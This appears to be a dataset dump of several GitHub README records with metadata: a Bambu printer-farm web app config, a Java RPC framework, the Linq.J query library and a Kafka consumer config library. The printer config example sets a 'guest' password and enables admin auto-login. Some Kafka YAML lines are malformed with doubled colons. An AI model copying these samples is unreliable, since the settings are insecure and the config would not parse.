bambu.cloud.token=FULL_JWT_TOKEN_FROM_COOKIES
```

### User Section

**Remember to encrypt your passwords with bcrypt (eg https://bcrypt-generator.com/)**

Current roles supported:

* `admin` - full access
* `normal` - only dashboard with readonly access

```properties
# https://bcrypt-generator.com/
#bambu.users.REPLACE_WITH_USERNAME.password=REPLACE_WITH_PASSWORD

# Insecure version:
#bambu.users.myUserName.password=myPassword
# Secure version:
bambu.users.myUserName.password=$2a$12$GtP15HEGIhqNdeKh2tFguOAg92B3cPdCh91rj7hklM7aSOuTMh1DC 
bambu.users.myUserName.role=admin
bambu.users.myUserName.dark-mode=false

#Guest account with readonly role
bambu.users.guest.password=guest
bambu.users.guest.role=normal

# Skip users and automatically login as admin (default: false)
bambu.auto-login=true
```

### Preheat

Default preheat configuration is below:
```properties
bambu.preheat[0].name=Off 0/0
bambu.preheat[0].bed=0
bambu.preheat[0].nozzle=0
bambu.preheat[1].name=PLA 55/220
bambu.preheat[1].bed=55
bambu.preheat[1].nozzle=220
bambu.preheat[2].name=ABS 90/270
bambu.preheat[2].bed=90
bambu.preheat[2].nozzle=270
```

### Remote View

Remote View is the ability to remotely view or stream the printer's camera.

```properties
# defaults to true, when false, disables remote view globally
bambu.remote-view=true

# defaults to true, when false, disables remote view for dashboard, but will still be available in detail view
bambu.dashboard.remote-view=true

# defaults to true, when false, disables per printer
bambu.printers.myprinter1.stream.enable=true
```


### Live View

Live View is the ability to remotely stream the X1C camera (or any other webcam) and requires Remote View to be enabled.

> [!NOTE]
> Getting the **LiveView** to work requires additional software. For more details check the [docker/bambu-liveview](docker/bambu-liveview) README.


```properties
bambu.live-view-url=/_camerastream/

# For each printer:
bambu.printers.PRINTER_ID.stream.live-view=true

# Default LiveView URL
bambu.printers.PRINTER_ID.stream.url=${bambu.live-view-url}${PRINTER_ID}

# Custom LiveView URL
bambu.printers.PRINTER_ID.stream.url=https://my_stream_domain.com/mystream
# 
```


### Bouncy Castle
`X1C` needs SSL Session Reuse so that SD Card functionality can work. Reference: https://stackoverflow.com/a/77587106/23289205

Without this you will see `552 SSL connection failed: session resuse required`.

Add to `.env`:
```properties
bambu.use-bouncy-castle=true
```
Add JVM startup flag:

bash / cmd:
```bash
java -Djdk.tls.useExtendedMasterSecret=false -jar bambu-web-x.x.x-runner.jar
```

powershell:
```powershell
java ""-Djdk.tls.useExtendedMasterSecret=false"" -jar bambu-web-x.x.x-runner.jar
```

### Uploading bigger files

Add to `.env`:
```properties
quarkus.http.limits.max-body-size=30M
```

### Configure XY/Z movement speeds

Add to `.env`:
```properties
# values are in mm/minute
bambu.move-xy=5000
bambu.move-z=3000
```

### Use Right click for menus

Add to `.env`:
```properties
bambu.menu-left-click=false
```

### Custom CSS

If you want to modify the CSS, create a file next to the `.jar` file called `styles.css`

* Changing the display columns

*Display columns is a ratio and scale based on screen width*

Refer to [bambu.css](/bambu/frontend/themes/bambu-theme/bambu.css#L1-L25)

| Example | value for XXX |
| -- | -- |
| always 1 column | 1 |
| 2 columns with 1080p | 3 |
| 4 columns with 1080p | 5 |

```css
:root {
  --bambu-default-columns: XXX;
}
```

# Debug

For debugging the application, add the following to .env and uncomment DEBUG or TRACE logging sections

```properties
### Log To File
quarkus.log.file.enable=true
quarkus.log.file.path=application.log


### DEBUG logging
#quarkus.log.category.""com.tfyre"".level=DEBUG


### TRACE logging
#quarkus.log.min-level=TRACE
#quarkus.log.category.""com.tfyre"".min-level=TRACE
#quarkus.log.category.""com.tfyre"".level=TRACE
```

# Links

## Inspirational Web interface

* https://github.com/davglass/bambu-farm/tree/main

## Printer MQTT Interface

* https://github.com/Doridian/OpenBambuAPI/blob/main/mqtt.md
* https://github.com/xperiments-in/xtouch/blob/main/src/xtouch/device.h
* https://github.com/SoftFever/OrcaSlicer/blob/main/src/slic3r/GUI/DeviceManager.hpp

## Remoteview

* https://github.com/bambulab/BambuStudio/issues/1536#issuecomment-1811916472


## Images from

* https://github.com/SoftFever/OrcaSlicer/tree/main/resources/images

## Json to Proto

* https://json-to-proto.github.io/
* https://formatter.org/protobuf-formatter
",14,27,2,apache-2.0,12.0,"['print', 'latest', 'firmware', 'important', 'http', 'bambulab', 'decided', 'block', 'printing', 'via', 'mqtt', 'unless', 'enable', 'lanmode', 'consider', 'downgrading', 'firmware', 'reference', 'check', 'cloud', 'section', 'enabling', 'cloud', 'mode', 'bambu', 'farm', 'web', 'based', 'application', 'monitor', 'multiple', 'bambu', 'printer', 'using', 'mqtt', 'ftp', 'rtsp', 'custom', 'firmware', 'required', 'technology', 'used', 'java', 'http', 'quarkus', 'http', 'vaadin', 'http', 'feature', 'supported', 'device', 'feature', 'mini', 'remote', 'view', 'x', 'x', 'x', 'x', 'x', 'upload', 'sd', 'card', 'x', 'x', 'x', 'x', 'x', 'print', 'sd', 'card', 'x', 'x', 'x', 'x', 'x', 'print', 'sd', 'card', 'batch', 'printing', 'x', 'x', 'am', 'x', 'x', 'send', 'custom', 'gcode', 'x', 'x', 'x', 'x', 'x', 'currently', 'sliced', 'project', 'supported', 'bambu', 'slicer', 'make', 'sure', 'slice', 'place', 'use', 'file', 'export', 'export', 'plate', 'sliced', 'file', 'creates', 'project', 'embedded', 'plate', 'ftp', 'connection', 'need', 'ssl', 'session', 'reuse', 'via', 'bouncy', 'castle', 'without', 'enabling', 'bouncy', 'castle', 'see', 'getting', 'liveview', 'work', 'requires', 'additional', 'software', 'detail', 'check', 'readme', 'batch', 'priting', 'allows', 'upload', 'sliced', 'select', 'plate', 'send', 'multiple', 'printer', 'filament', 'mapping', 'screenshots', 'dashboard', 'batch', 'printing', 'screenshots', 'doc', 'want', 'run', 'make', 'sure', 'java', 'installed', 'verify', 'download', 'latest', 'release', 'new', 'folder', 'use', 'liner', 'create', 'config', 'file', 'minimal', 'config', 'check', 'full', 'config', 'option', 'section', 'want', 'tweak', 'setting', 'run', 'starting', 'correctly', 'show', 'number', 'printer', 'count', 'head', 'http', 'log', 'building', 'running', 'building', 'create', 'new', 'directory', 'copy', 'example', 'running', 'access', 'via', 'http', 'username', 'admin', 'password', 'admin', 'running', 'service', 'refer', 'example', 'config', 'minimal', 'config', 'remeber', 'replace', 'field', 'create', 'file', 'following', 'config', 'full', 'config', 'option', 'default', 'option', 'displayed', 'add', 'config', 'want', 'change', 'dark', 'mode', 'printer', 'section', 'cloud', 'section', 'enable', 'mqtt', 'connection', 'via', 'cloud', 'instead', 'directly', 'printer', 'either', 'provide', 'access', 'token', 'option', 'provide', 'username', 'password', 'http', 'format', 'option', 'access', 'token', 'access', 'token', 'fetched', 'browser', 'cooky', 'liner', 'curl', 'configuration', 'user', 'section', 'remember', 'encrypt', 'password', 'bcrypt', 'eg', 'http', 'current', 'role', 'supported', 'full', 'access', 'dashboard', 'readonly', 'access', 'preheat', 'default', 'preheat', 'configuration', 'remote', 'view', 'remote', 'view', 'ability', 'remotely', 'view', 'stream', 'printer', 'camera', 'live', 'view', 'live', 'view', 'ability', 'remotely', 'stream', 'camera', 'webcam', 'requires', 'remote', 'view', 'enabled', 'note', 'getting', 'liveview', 'work', 'requires', 'additional', 'software', 'detail', 'check', 'readme', 'bouncy', 'castle', 'need', 'ssl', 'session', 'reuse', 'sd', 'card', 'functionality', 'work', 'reference', 'http', 'without', 'see', 'add', 'add', 'jvm', 'startup', 'flag', 'bash', 'cmd', 'powershell', 'uploading', 'bigger', 'file', 'add', 'configure', 'movement', 'speed', 'add', 'use', 'right', 'click', 'menu', 'add', 'custom', 'cs', 'want', 'modify', 'cs', 'create', 'file', 'next', 'file', 'called', 'changing', 'display', 'column', 'display', 'column', 'ratio', 'scale', 'based', 'screen', 'width', 'refer', 'example', 'value', 'xxx', 'always', 'column', 'column', 'column', 'debug', 'debugging', 'application', 'add', 'following', 'uncomment', 'debug', 'trace', 'logging', 'section', 'link', 'inspirational', 'web', 'interface', 'http', 'printer', 'mqtt', 'interface', 'http', 'http', 'http', 'remoteview', 'http', 'image', 'http', 'json', 'proto', 'http', 'http']","['x', 'http', 'config', 'printer', 'view']",3,0,0,"['can', 'not', 'print', 'late', 'firmware', 'bambu', 'farm', 'feature', 'supported', 'device', 'screenshots', 'i', 'want', 'run', 'java', 'java', 'building', 'running', 'run', 'service', 'example', 'config', 'minimal', 'config', 'full', 'config', 'option', 'dark', 'mode', 'gobal', 'per', 'user', 'will', 'default', 'global', 'omit', 'printer', 'section', 'cloud', 'section', 'let', 'bambufarm', 'login', 'fetch', 'token', 'fetch', 'token', 'via', 'curl', 'paste', 'user', 'section', 'http', 'insecure', 'version', 'secure', 'version', 'skip', 'user', 'automatically', 'login', 'admin', 'default', 'false', 'preheat', 'remote', 'view', 'default', 'true', 'false', 'disables', 'remote', 'view', 'globally', 'default', 'true', 'false', 'disables', 'remote', 'view', 'dashboard', 'still', 'available', 'detail', 'view', 'default', 'true', 'false', 'disables', 'per', 'printer', 'live', 'view', 'for', 'printer', 'default', 'liveview', 'url', 'custom', 'liveview', 'url', 'bouncy', 'castle', 'upload', 'big', 'file', 'configure', 'movement', 'speed', 'value', 'use', 'right', 'click', 'menu', 'custom', 'cs', 'debug', 'log', 'to', 'file', 'debug', 'logging', 'trace', 'log', 'link', 'inspirational', 'web', 'interface', 'printer', 'mqtt', 'interface', 'remoteview', 'image', 'json', 'proto']",50,"['default', 'view', 'printer', 'false', 'config']",23,0.0,4.0,"[com.vaadin:vaadin-maven-plugin,io.quarkus:quarkus-maven-plugin,io.smallrye:jandex-maven-plugin,maven-failsafe-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:jaxb2-maven-plugin]",0.0,3.0,1.0,14010,65.125,4.773032629558541,"['!142 -> https://github.com/TFyre/bambu-farm/issues/142', '![ko-fi -> https://ko-fi.com/img/githubbutton_sm.svg', 'releases -> https://github.com/TFyre/bambu-farm/releases/latest', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x']",27
zhushimmer/enhance-rpc-zt,main,"# description
一款自研RPC框架，通过对原始Dubbo的使用，并进行测试，发现一些性能问题，之后做出的修改与性能提升，本身一款软件不可能是完美无缺，对于软件的自研提升性能的同时，对底层框架的了解，有助于自己更好，更高效的使用
# Usage and Enhance
## 1 Future change CompletaleFutue
Future:表示异步计算结果的接口

  我有一个任务，提交给了 Future 来处理。任务执行期间我自己可以去做任何想做的事情。并且，在这期间我还可以取消任务以及获取任务的执行状态。一段时间之后，我就可以 Future 那里直接取出任务执行结果。
  
  Future 在实际使用过程中存在一些局限性比如不支持异步任务的编排组合、获取计算结果的 get() 方法为阻塞调用。
  
CompletaleFutue: 基于事件驱动的异步回调类

  CompletableFuture 除了提供了更为好用和强大的 Future 特性之外，还提供了函数式编程、异步任务编排组合（可以将多个异步任务串联起来，组成一个完整的链式调用）等能力。


### 问题发现：


如果一个方法里面涉及到了 3 个 rpc 调用，假设每个 rpc 调用都需要 10ms，那么这个方法总耗时将不低于 30ms。

```JAVA
public boolean provingOrder(long userId, long itemId, double rate) {
    
    // 验证用户能否享受这一待遇，RPC调用
    boolean provingDiscount = provingService.proving(userId, itemId, rate);
    
    if(!provingDiscount) {
        // 该用户无法享受这一折扣
        return false;
    }
    
    // 获取药品单价，RPC调用
    double itemPrice = storeService.getPrice(itemId);
    
    // 用户实际应该支付的药品价格
    double realPrice = itemPrice * rate;
    
    // 获取用户账号历年余额，限定了只能使用历年余额购买，RPC调用
    double balance = userService.getBalance(userId);
            
    return realPrice <= balance;
}
```

在同步调用系统中，延迟同时会导致吞吐量的下降。如果只有一个线程，那么系统每秒的吞吐量将不会高于 1000ms / 30ms，也就是最多 33 qps。同步系统要提高吞吐量，唯一的办法就是加大线程数。同时启用 1,000 个线程，吞吐量理论值可以上升到 33,333 qps。不过实际使用中，这并不是完美的方案：增加线程数量会导致频繁的上下文切换，系统整体性能将会严重下降。


引入Future：3 个 rpc 调用可以同时进行了，系统延迟降低为之前的 1/3。不过延迟降低吞吐量的问题还是没有解决，依然需要通过增加线程数来提升吞吐量。
```Java
public boolean provingOrder(long userId, long itemId, double rate) {
  // 验证用户能否享受这一待遇，RPC调用
    Future<Boolean> provingDiscountFuture = discountService.proving(userId, itemId, rate);
    
   // 获取药品单价，RPC调用
    Future<Double> itemPriceFuture = storeService.getPrice(itemId);
    
 // 获取用户账号历年余额，限定了只能使用历年余额购买，RPC调用
    Future<Double> balanceFuture = userService.getBalance(userId);

    if(!provingDiscountFuture.get()) {
        // 该用户无法享受这一折扣
        return false;
    }

    // 用户实际应该支付的药品价格
    double realPrice = itemPriceFuture.get() * rate;

    // 用户账号历年余额
    double balance = balanceFuture.get();
            
    return realPrice <= balance;
}
```

引入CompletableFuture:延迟降低为原来 1/3，同时吞吐量也不会因为延迟而降低。非常完美，简单高效，CompletableFuture 绝对称得上是大杀器。在 rpc 异步调用这个问题上，没什么比 CompletableFuture 更适合的解决方案了。CompletableFuture 是 Doug Lea 的又一力作，彻底解决了 Future 的缺陷，把 Java 带入了异步响应式编程的新世界。
```Java
 
public boolean provingOrder(long userId, long itemId, double rate) {
  // 验证用户能否享受这一待遇，RPC调用
    Future<Boolean> provingDiscountFuture = discountService.proving(userId, itemId, rate);
    
   // 获取药品单价，RPC调用
    Future<Double> itemPriceFuture = storeService.getPrice(itemId);
    
 // 获取用户账号历年余额，限定了只能使用历年余额购买，RPC调用
    Future<Double> balanceFuture = userService.getBalance(userId);

return CompletableFuture
        .allOf(verifyDiscountFuture, itemPriceFuture, balanceFuture)
        .thenApply(v -> {
            if(!verifyDiscountFuture.get()) {
                // 该用户无法享受这一折扣
                return false;
            }

            // 用户实际应该支付的价格
            double realPrice = itemPriceFuture.get() * rate;

            // 用户账号余额
            double balance = balanceFuture.get();
                    
            return realPrice <= balance;
        });    
}
```

  demo1:列出一个小demo,具体部分见代码
  ```Java
private <T> CompletableFuture<T> handleResult(//
			final Request request, //
			final CompletableFuture<Response> future, //
			final Invoker<CompletableFuture<?>> failoverInvoker, //
			final MethodParam methodParam) {
```
## 2 Serializable and Deserialize  pull_in MethodParam

高性能的方法参数封装，减少自动装箱调用，通过字节码生成直接调用。

方法参数封装，用于序列化传输参数数据，其实现类会自动根据方法名称生成get/set方法。

```Java
public static Class<? extends MethodParam> createClass(Method method)
			throws CannotCompileException, NotFoundException {
		Objects.requireNonNull(method, ""method must not be null"");

		if (method.getParameterCount() == 0) {
			return EmptyMethodParam.class;
		}

		Class<? extends MethodParam> methodParamClass = methodParamClassMap.get(method);
		if (methodParamClass != null) {
			return methodParamClass;
		}

		synchronized (MethodParamClassFactory.class) {
			methodParamClass = methodParamClassMap.get(method);
			if (methodParamClass != null) {
				return methodParamClass;
			}

			methodParamClass = doCreateClass(method);
			methodParamClassMap.put(method, methodParamClass);
		}

		return methodParamClass;
	}
```
## 3
Dubbo 的消息格式
```Java
public class RpcInvocation implements Invocation, Serializable {
    private String methodName;
    private Class<?>[] parameterTypes;
    private Object[] arguments;
    ...
}
```
基本的内置服务，建立连接后需要调用,将方法以及参数封装成MethodParam类，固定死顺序，保证serviceId为预设值，为每个方法设置一个id存入ConcurrentHashMap.通过服务id获取invoker
```Java
	@Override
	public CompletableFuture<List<String>> getClassRegisterList() {
		return CompletableFuture.completedFuture(invokerFactory.getClassRegisterList());
	}
```

# Contact
If you have any issues or feature requests, please contact us. PR is welcomed.
https://github.com/zhushimmer/enhance-rpc-zt/issues
",0,0,1,apache-2.0,0.0,"['description', 'usage', 'enhance', 'future', 'change', 'completalefutue', 'future', 'future', 'future', 'future', 'get', 'completalefutue', 'completablefuture', 'future', 'rpc', 'rpc', 'rpc', 'rpc', 'completablefuture', 'doug', 'lea', 'future', 'java', 'serializable', 'deserialize', 'methodparam', 'dubbo', 'contact', 'issue', 'feature', 'request', 'please', 'contact', 'u', 'pr', 'welcomed', 'http']","['future', 'rpc', 'completalefutue', 'completablefuture', 'contact']",0,0,0,"['description', 'usage', 'enhance', 'future', 'change', 'completalefutue', 'serializable', 'deserialize', 'methodparam', 'contact']",7,"['description', 'usage', 'enhance', 'future', 'change']",7,0.0,9.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,8.0,1.0,4932,88.8,8.038288288288289,[],0
erupts/Linq.J,main,"# Linq.J A Memory-based Object Query language
[中文](./README-zh.md) / English

`Java uses Linq capabilities similar to C#` [C# Linq](https://learn.microsoft.com/zh-cn/dotnet/csharp/linq/)

<p>
    <a href=""https://www.erupt.xyz"" target=""_blank""><img src=""https://img.shields.io/badge/Linq.J-brightgreen"" alt=""Erupt Framework""></a>
    <a href=""https://mvnrepository.com/search?q=linq.j""><img src=""https://img.shields.io/maven-central/v/xyz.erupt/linq.j"" alt=""maven-central""></a>
    <a href=""https://www.oracle.com/technetwork/java/javase/downloads/index.html""><img src=""https://img.shields.io/badge/JDK-8+-green.svg"" alt=""jdk 8+""></a>
    <a href=""./LICENSE""><img src=""https://img.shields.io/badge/license-MIT-blue"" alt=""license Apache 2.0""></a>
    <a href='https://gitee.com/erupt/linq/stargazers'><img src='https://gitee.com/erupt/linq/badge/star.svg?theme=gray' alt='GitEE star' ></img></a>
    <a href=""https://github.com/erupts/linq.j""><img src=""https://img.shields.io/github/stars/erupts/linq.j?style=social"" alt=""GitHub stars""></a>
</p>

### Linq is Object oriented sql, linq is actually a query on the data in memory, enabling developers to write queries more easily. These query expressions look a lot like SQL

> You can join, filter, sort, and group data sources with minimal code. These operations can be combined in a single query to obtain more complex results

#### allows you to write Java code that manipulates in-memory data in the same way that you query a database, for example
- List, Array
- SQL result data
- CSV, XML, JSON document datasets
- Stream, File stream

#### Application Scenarios
- Result association for RPCS such as Feign/Dubbo during distributed development
- In-memory computation of heterogeneous system data
- Use code to organize SQL result data
- Sorted aggregation of multiple result objects with in-memory paging
- Semantic object transformation and mapping
- Clean code, no need for loops and branches to manipulate data
- Federated access across data sources

#### Operation syntax
`From` `Select` `Distinct`、`Join`、`Where`、`Group By`、`Order By`、`Limit`、`Offset`、`...`

#### Tips
⚠️ Note: The object field must have a get method to facilitate lambda lookup. It is recommended to use the **Lombok** @Getter annotation to quickly create get access to the field

#### How to Use
It has zero external dependencies and is only 50kb in size
```xml
<dependency>
    <groupId>xyz.erupt</groupId>
    <artifactId>linq.j</artifactId>
    <version>0.0.5</version>
</dependency>
```

#### Example 1
```javascript
var strings = Linq.from(""C"", ""A"", ""B"", ""B"").gt(Th::is, ""A"").orderByDesc(Th::is).write(String.class);
// [C, B, B]

var integers = Linq.from(1, 2, 3, 7, 6, 5).orderBy(Th::is).write(Integer.class);
// [1, 2, 3, 5, 6, 7]

var name = Linq.from(data)
    // left join
    .innerJoin(target, Target::getId, Data::getId)
    // where like
    .like(Data::getName, ""a"")
    // select name
    .select(Data::getName)
    // distinct
    .distinct()
    // order by 
    .orderBy(Data::getName)
    .write(String.class);

```

#### Example 2
```java
public class ObjectQuery{

    private final List<TestSource> source = http.get(""https://gw.alipayobjects.com/os/antfincdn/v6MvZBUBsQ/column-data.json"");

    private final List<TestSourceExt> target = mongodb.query(""db.target.find()"");
    
    /**
     * select demo
     */
    public void select(){
        // select *
        Linq.from(source).select(TestSource.class);
        // select a, b, c
        Linq.from(source)
                .select(TestSource::getName, TestSource::getDate, TestSource::getTags)
                .select(TestSource::getTags, ""tag2"") // alias
                .select(Columns.ofx(TestSource::getId, id -> id + ""xxx"")); // value convert
        // select count(*), sum(id), max(id) 
        Linq.from(source)
                .select(Columns.count(""count""))
                .select(Columns.sum(TestSource::getId, ""sum""))
                .select(Columns.max(TestSource::getId, ""max""));
    }

    
    /**
     * join demo
     */
    public void join(){
        // left join
        Linq.from(source).leftJoin(target, TestSourceExt::getId, TestSource::getId)
                .select(TestSource.class)
                .select(TestSourceExt::getName)
                .select(TestSourceExt2::getValue);
        // right join
        Linq.from(source).rightJoin(target, TestSourceExt::getId, TestSource::getId);
        // inner join
        Linq.from(source).innerJoin(target, TestSourceExt::getId, TestSource::getId);
        // full join
        Linq.from(source).fullJoin(target, TestSourceExt::getId, TestSource::getId);
    }

    
    /**
     * where demo
     */
    public void where() {
        // =
        Linq.from(source).eq(TestSource::getName, ""Thanos"").select(Columns.count(countAlias)).writeOne(Integer.class);
        // >=:lval and <=:rval
        Linq.from(source).between(TestSource::getId, 1, 3);
        // in (x,x,x)
        Linq.from(source).in(TestSource::getId, 1, 2, 3);
        // like '%x%'
        Linq.from(source).like(TestSource::getName, ""a"");
        // is null
        Linq.from(source).isNull(TestSource::getId);
        
        // customer single field where
        Linq.from(source).where(TestSource::getId, id -> id >= 5);
        
        // customer condition or multi field
        Linq.from(source).where(data -> {
            String name = data.get(TestSource::getName);
            Integer age = (Integer)data.get(TestSource::getAge);
            // name = 'xxx' or age > 10
            return ""xxx"".equals(name) || age > 10;
        });
    }

    
    /**
     * group by demo
     */
    public void groupBy(){
        Linq.from(source)
            .groupBy(TestSource::getName)
            .select(
                Columns.of(TestSource::getName, ""name""),
                Columns.min(TestSource::getDate, ""min""),
                Columns.avg(TestSource::getId, ""avg""),
                Columns.count(""count""),
                Columns.count(TestSource::getName, ""countName""),
                Columns.countDistinct(TestSource::getName, ""countDistinct"")
            )
            .having(row -> Integer.parseInt(row.get(""avg"").toString()) > 2)
            .orderBy(TestSource::getAge);
    }

    
    /**
     * result write demo
     */
    public void write(){
        // write List<Object>
        List<TestSource> list = Linq.from(source).orderByAsc(TestSource::getDate).write(TestSource.class);
        // write Object
        TestSource obj = Linq.from(source).limit(3).writeOne(TestSource.class);
        // write List<Map>
        List<Map<String, Object>> map = Linq.from(source).writeMap();
        // write Map
        Map<String, Object> mapOne = Linq.from(source).writeMapOne();
    }
    
}

```

#### Next iteration plan

- [ ] Supports combining multiple query result sets: UNION ALL, UNION, INTERSECT, EXCEPT, UNION BY NAME
- [ ] Supports window functions
- [ ] Support Nested loop join
- [x] supports having
- [x] Support group column format group by date(created_at)",5,0,2,mit,7.0,"['object', 'query', 'language', 'english', 'c', 'linq', 'linq', 'object', 'oriented', 'sql', 'linq', 'actually', 'query', 'data', 'memory', 'enabling', 'developer', 'write', 'query', 'easily', 'query', 'expression', 'look', 'lot', 'like', 'sql', 'join', 'filter', 'sort', 'group', 'data', 'source', 'minimal', 'code', 'operation', 'combined', 'single', 'query', 'obtain', 'complex', 'result', 'allows', 'write', 'java', 'code', 'manipulates', 'data', 'way', 'query', 'database', 'example', 'list', 'array', 'sql', 'result', 'data', 'csv', 'xml', 'json', 'document', 'datasets', 'stream', 'file', 'stream', 'application', 'scenario', 'result', 'association', 'rpcs', 'distributed', 'development', 'computation', 'heterogeneous', 'system', 'data', 'use', 'code', 'organize', 'sql', 'result', 'data', 'sorted', 'aggregation', 'multiple', 'result', 'object', 'paging', 'semantic', 'object', 'transformation', 'mapping', 'clean', 'code', 'need', 'loop', 'branch', 'manipulate', 'data', 'federated', 'access', 'across', 'data', 'source', 'operation', 'syntax', 'tip', 'note', 'object', 'field', 'must', 'get', 'method', 'facilitate', 'lambda', 'lookup', 'recommended', 'use', 'lombok', 'getter', 'annotation', 'quickly', 'create', 'get', 'access', 'field', 'use', 'zero', 'external', 'dependency', 'size', 'example', 'example', 'next', 'iteration', 'plan', 'support', 'combining', 'multiple', 'query', 'result', 'set', 'union', 'union', 'intersect', 'except', 'union', 'name', 'support', 'window', 'function', 'support', 'nested', 'loop', 'join', 'x', 'support', 'x', 'support', 'group', 'column', 'format', 'group', 'date']","['data', 'query', 'result', 'object', 'support']",3,0,0,"['a', 'object', 'query', 'language', 'linq', 'http', 'linq', 'object', 'orient', 'sql', 'linq', 'actually', 'query', 'data', 'memory', 'enable', 'developer', 'write', 'query', 'easily', 'these', 'query', 'expression', 'look', 'lot', 'like', 'sql', 'allows', 'write', 'java', 'code', 'manipulate', 'data', 'way', 'query', 'database', 'example', 'application', 'scenario', 'operation', 'syntax', 'tip', 'how', 'use', 'example', 'example', 'next', 'iteration', 'plan']",11,"['query', 'linq', 'example', 'object', 'sql']",3,30.0,1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-scm-plugin,org.apache.maven.plugins:maven-source-plugin]",0.0,1.0,0.0,7051,222.0,4.960585585585585,"['C# Linq -> https://learn.microsoft.com/zh-cn/dotnet/csharp/linq/', ' ', ' ', ' ', 'x', 'x']",6
Trendyol/kafkathena-jakarta,master,"<div id=""top""></div>
<p align=""center"">
<img src=""docs/images/kafkathena_logo.png"" width=""250"" alt=""Kafkathena""/>
</p>

<h1 align=""center"">Smart, Fast, Customizable Consumer Configurations</h1>

<p align=""center"">
<a href=""https://github.com/Trendyol/kafkathena-commons/blob/next/LICENSE"">
    <img src=""https://img.shields.io/github/v/release/Trendyol/kafkathena-commons"" alt=""Release"" />
  </a>
<a href=""https://img.shields.io/badge/spring%20boot-2.x%7C3.x-orange"">
    <img src=""https://img.shields.io/badge/spring%20boot-2.x%7C3.x-orange"" alt=""License"" />
  </a>
  <a href=""https://github.com/Trendyol/kafkathena-commons/blob/next/LICENSE"">
    <img src=""https://img.shields.io/github/license/trendyol/baklava"" alt=""Spring Boot Version"" />
  </a>
</p>

<!-- ABOUT THE PROJECT -->
## About The Project

There are many great kafka configurations libraries; however, we didn't find one that really suited our needs so we created this enhanced one. Kafkathena provided by [Trendyol](https://github.com/trendyol)

Here's why:
* Your time should be focused on creating only consumer business. This library that solves a kafka configuration time complexity on your projects.
* Add as dependency, create consumer/producer configs, create consumer class and go!

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Features -->
## Features

* Config as a consumer and producers
* Consumer Acknowledge Customize Support
* Multiple Kafka Cluster Support
* Failover Error Topic and Custom Class Implementation
* Fixed Retry and Exponential Retry Support
* Consumer base ignore exceptions in failover
* Single Error Topic With Multiple Consumers
* Single Error Topic With Header Key Listening
* Filtered Consume Message
* Seperated Consume and Error Cluster
* Avro/Protobuffer Deserializer Support
* Authentication Base Cluster Support
* Kafka Message Sender Utility
* Spring 2.x/3.x, JDK 11/17 Support

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- Build With -->
### Built With

This section should list any major frameworks/libraries used to bootstrap your project. Leave any add-ons/plugins for the acknowledgements section. Here are a few examples.

* [Spring Starter 3+]
* [Spring Kafka Starter]
* [Jdk 17]

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- GETTING STARTED -->
## Getting Started

This is an example of how you may give instructions on setting up your project locally.
To get a local copy up and running follow these simple example steps.

### Prerequisites

This is an example of how to list things you need to use the software and how to install them.
* Maven 3+
* Jdk 17

### Installation
1. Copy and paste this inside your pom.xml dependencies block.
```xml
<dependency>
  <groupId>com.trendyol</groupId>
  <artifactId>kafkathena-jakarta</artifactId>
  <version>RELEASE</version>
</dependency>
```

<p align=""right"">(<a href=""#top"">back to top</a>)</p>

<!-- USAGE EXAMPLES -->
## Usage

1. Add kafkathena
1. Add $`\textcolor{red}{\text{@EnableKafkathena}}`$ annotation as a configuration on SpringBoot Application
2. Create kafkathena config.yml

```
kafkathena:
  shared-factory-props:
    producer:
      interceptor: ""com.trendyol.mpc.kafkathena.commons.interceptor.KSProducerInterceptor""
    consumer:
      interceptor: ""com.trendyol.mpc.kafkathena.commons.interceptor.KSConsumerInterceptor""
      autoStartup: true
      missingTopicAlertEnable: false
      concurrency: 1
      syncCommitTimeoutSecond: 5
      syncCommit: true
      batch: false
      ackMode: RECORD
    clusters:
      ""[confluent]"":
        servers: localhost:9092
    
  producers:
    default:
      cluster: confluent
      props:
        ""[batch.size]"": 16384
        ""[linger.ms]"": 0
        ""[buffer.memory]"": 33554432
        ""[key.serializer]"": org.apache.kafka.common.serialization.StringSerializer
        ""[value.serializer]"": org.springframework.kafka.support.serializer.JsonSerializer
        ""[acks]"": ""1""
        ""[request.timeout.ms]"": 30000
  consumers:
    ""[consumer-one]"":
      type: JSON # AVRO/PROTO/JSON it can be empty
      topic: kafkathena.topic.one
      factory-bean-name: consumerOneKafkaListenerContainerFactory
      data-class: com.trendyol.kafkathena.demo.model.ConsumerOneMessage
      error-producer-name: default
      cluster: confluent
      filter-header:
        error-producer-filter-key: one-filter
        consumer-filter-key: one-filter
      failover:
        error-topic: kafkathena.topic.error
        handler-bean-name: defaultConsumerFailoverHandler
      fixed-retry:
        retry-count: 1
        backoff-interval-millis: : 5000 #wait time for retry
      exponential-retry:
        retry-count: : 1
        multiplier: 2
        maxInterval: 5
        backoff-interval-millis: : 1000
      factory-props:
        auto-startup: : true
        missing-topic-alert-enable: : false
        concurrency: 1
        sync-commit-timeout-second: : 5
        sync-commit: : true
        ack-mode: : RECORD
        interceptor-class-path: : com.trendyol.kafkathena.demo.interceptor.KafkaConsumerInterceptor
      props:
        ""[group.id]"": kafkathena.topicOneGroup
        ""[value.deserializer]"": org.springframework.kafka.support.serializer.ErrorHandlingDeserializer
        ""[spring.deserializer.value.delegate.class]"": org.springframework.kafka.support.serializer.JsonDeserializer
        ""[key.deserializer]"": org.springframework.kafka.support.serializer.ErrorHandlingDeserializer
        ""[spring.deserializer.key.delegate.class]"": org.apache.kafka.common.serialization.StringDeserializer
        ""[max.poll.records]"": 100
        ""[max.poll.interval.ms]"": 300000
        ""[session.timeout.ms]"": 300000
        ""[heartbeat.interval.ms]"": 3000
        ""[enable.auto.commit]"": true
        ""[auto.offset.reset]"": earliest
        ""[fetch.max.bytes]"": 52428800
